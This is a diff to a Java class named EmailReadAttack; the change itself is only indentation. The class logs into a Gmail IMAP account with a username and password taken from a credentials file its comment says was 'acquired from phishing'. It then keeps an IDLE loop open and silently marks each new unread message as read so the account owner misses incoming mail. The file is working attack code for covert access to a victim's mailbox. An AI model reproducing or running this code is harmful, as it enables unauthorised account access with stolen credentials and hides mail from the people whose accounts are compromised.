@@ -40,141 +40,141 @@ import jakarta.mail.event.MessageChangedListener;
  */
 public class EmailReadAttack {
 
-	private String username;
-	private String password;
-	private final int IMAPS_PORT = 993;
-	private final String HOST = "imap.googlemail.com";
-	private final String PATH = "/credentials.txt";
-	private Folder emailFolder;
+    private String username;
+    private String password;
+    private final int IMAPS_PORT = 993;
+    private final String HOST = "imap.googlemail.com";
+    private final String PATH = "/credentials.txt";
+    private Folder emailFolder;
 
-	/**
-	 * Constructor that uses Jakarta Mail to access emails.
-	 */
-	public EmailReadAttack() {
-		try {
-			readMail();
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+    /**
+     * Constructor that uses Jakarta Mail to access emails.
+     */
+    public EmailReadAttack() {
+        try {
+            readMail();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-	/**
-	 * Reads the mail and sets up IMAP.
-	 * 
-	 * @throws MessagingException
-	 */
-	private void readMail() throws MessagingException {
-		readFile();
+    /**
+     * Reads the mail and sets up IMAP.
+     * 
+     * @throws MessagingException
+     */
+    private void readMail() throws MessagingException {
+        readFile();
 
-		// create properties field
-		Properties properties = new Properties();
-		properties.setProperty("mail.imaps.partialfetch", "false");
-		properties.setProperty("mail.user", username);
-		properties.setProperty("mail.password", password);
+        // create properties field
+        Properties properties = new Properties();
+        properties.setProperty("mail.imaps.partialfetch", "false");
+        properties.setProperty("mail.user", username);
+        properties.setProperty("mail.password", password);
 
-		Session emailSession = Session.getDefaultInstance(properties);
+        Session emailSession = Session.getDefaultInstance(properties);
 
-		Store store = emailSession.getStore("imaps");
+        Store store = emailSession.getStore("imaps");
 
-		try {
-			store.connect(HOST, IMAPS_PORT, username, password);
-		} catch (Exception e) {
-			e.printStackTrace();
-			return;
-		}
+        try {
+            store.connect(HOST, IMAPS_PORT, username, password);
+        } catch (Exception e) {
+            e.printStackTrace();
+            return;
+        }
 
-		// create the folder object and open it
-		emailFolder = store.getFolder("INBOX");
-		emailFolder.open(Folder.READ_WRITE);
+        // create the folder object and open it
+        emailFolder = store.getFolder("INBOX");
+        emailFolder.open(Folder.READ_WRITE);
 
-		emailFolder.addConnectionListener(new ConnectionAdapter() {
-			@Override
-			public void closed(ConnectionEvent e) {
-				try {
-					// In case the folder closes, reopen it.
-					emailFolder.open(Folder.READ_WRITE);
-				} catch (MessagingException e1) {
-					e1.printStackTrace();
-				}
-			}
-		});
+        emailFolder.addConnectionListener(new ConnectionAdapter() {
+            @Override
+            public void closed(ConnectionEvent e) {
+                try {
+                    // In case the folder closes, reopen it.
+                    emailFolder.open(Folder.READ_WRITE);
+                } catch (MessagingException e1) {
+                    e1.printStackTrace();
+                }
+            }
+        });
 
-		emailFolder.addMessageChangedListener(new MessageChangedListener() {
-			@Override
-			public void messageChanged(MessageChangedEvent e) {
-				if(e.getMessageChangeType() == MessageChangedEvent.FLAGS_CHANGED) {
-					try {
-						if(!e.getMessage().isSet(Flags.Flag.SEEN)) {
-							System.out.println("[LOG] Received Unread Message: " + e.getMessage().getSubject());
-							// If this flag (SEEN) is not the one that has changed i.e. the read values on
-							// client and server are same, return
-							e.getMessage().setFlag(Flags.Flag.SEEN, true);
-							System.out.println("[LOG] Changing to Read... 😈");
-						}
-					} catch (Exception e1) {
-						e1.printStackTrace();
-					}
-				}
-			}
-		});
+        emailFolder.addMessageChangedListener(new MessageChangedListener() {
+            @Override
+            public void messageChanged(MessageChangedEvent e) {
+                if(e.getMessageChangeType() == MessageChangedEvent.FLAGS_CHANGED) {
+                    try {
+                        if(!e.getMessage().isSet(Flags.Flag.SEEN)) {
+                            System.out.println("[LOG] Received Unread Message: " + e.getMessage().getSubject());
+                            // If this flag (SEEN) is not the one that has changed i.e. the read values on
+                            // client and server are same, return
+                            e.getMessage().setFlag(Flags.Flag.SEEN, true);
+                            System.out.println("[LOG] Changing to Read... 😈");
+                        }
+                    } catch (Exception e1) {
+                        e1.printStackTrace();
+                    }
+                }
+            }
+        });
 
-		startLoop(); // start loop for incoming messages
-	}
+        startLoop(); // start loop for incoming messages
+    }
 
-	/**
-	 * Creates a new {@link Thread} to enter idle mode.
-	 */
-	private void startLoop() {
-		System.out.println("[LOG] Started IDLE loop.");
-		new Thread(() -> {
-			while(true) {
-				// idle() corresponds to the IMAP IDLE command. The server automatically sends
-				// notifications, eliminating the need for polling.
-				// We put this in a loop because the idle() method will return when an IMAP
-				// command is issued (for example when we mark as read).
-				try {
-					((IMAPFolder) emailFolder).idle();
-				} catch (MessagingException e) {
-					e.printStackTrace();
-				}
-			}
-		}).start();
-	}
+    /**
+     * Creates a new {@link Thread} to enter idle mode.
+     */
+    private void startLoop() {
+        System.out.println("[LOG] Started IDLE loop.");
+        new Thread(() -> {
+            while(true) {
+                // idle() corresponds to the IMAP IDLE command. The server automatically sends
+                // notifications, eliminating the need for polling.
+                // We put this in a loop because the idle() method will return when an IMAP
+                // command is issued (for example when we mark as read).
+                try {
+                    ((IMAPFolder) emailFolder).idle();
+                } catch (MessagingException e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
+    }
 
-	/**
-	 * Read the file acquired from phishing.
-	 */
-	private void readFile() {
-		try {
-			BufferedReader br = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(PATH), "UTF-8"));
-			try {
-				String line = "";
-				int i = 0;
-				while((line = br.readLine()) != null) {
-					if(i % 2 == 0) {
-						username = line;
-					}
-					else {
-						password = line;
-						break; // Even if there are other usernames and passwords, we only want the first pair.
-					}
-					i++;
-				}
-			} finally {
-				br.close();
-			}
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+    /**
+     * Read the file acquired from phishing.
+     */
+    private void readFile() {
+        try {
+            BufferedReader br = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(PATH), "UTF-8"));
+            try {
+                String line = "";
+                int i = 0;
+                while((line = br.readLine()) != null) {
+                    if(i % 2 == 0) {
+                        username = line;
+                    }
+                    else {
+                        password = line;
+                        break; // Even if there are other usernames and passwords, we only want the first pair.
+                    }
+                    i++;
+                }
+            } finally {
+                br.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-	/**
-	 * Main method.
-	 * 
-	 * @param args not used
-	 */
-	public static void main(String[] args) {
-		new EmailReadAttack();
-	}
+    /**
+     * Main method.
+     * 
+     * @param args not used
+     */
+    public static void main(String[] args) {
+        new EmailReadAttack();
+    }
 
 }
